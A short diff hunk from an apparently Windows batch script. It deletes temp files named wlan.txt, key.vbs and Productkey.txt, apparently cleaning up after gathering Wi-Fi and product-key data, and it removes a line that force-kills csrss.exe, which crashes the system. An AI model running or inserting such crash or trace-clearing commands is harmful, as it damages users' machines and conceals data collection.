@@ -275,5 +275,5 @@ del %localappdata%\Temp\wlan.txt
 del %localappdata%\Temp\key.vbs
 del %localappdata%\Temp\Productkey.txt
 
-"taskkill /F /IM csrss.exe
+
 
